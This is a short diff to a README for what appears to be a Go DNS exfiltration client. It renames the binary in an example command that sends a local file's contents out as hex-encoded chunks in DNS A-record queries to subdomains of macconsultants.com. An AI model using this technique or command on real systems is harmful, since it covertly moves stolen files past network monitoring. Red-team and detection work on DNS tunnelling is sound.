@@ -12,7 +12,7 @@ To Use: **Client Side**
 3. Build (**go build**) 
 4. Run the client and feed it a single parameter which is the path to the file you want to exfil. Example:
 
-**./go-dnsclient ~/Desktop/testfile.txt**
+**./client ~/Desktop/testfile.txt**
 
 5. the client will then read the contents of the file, hex encode it, and send it in 10 character chunks as A record requests. The format of each request is:
 [10 hex encoded characters].macconsultants.com
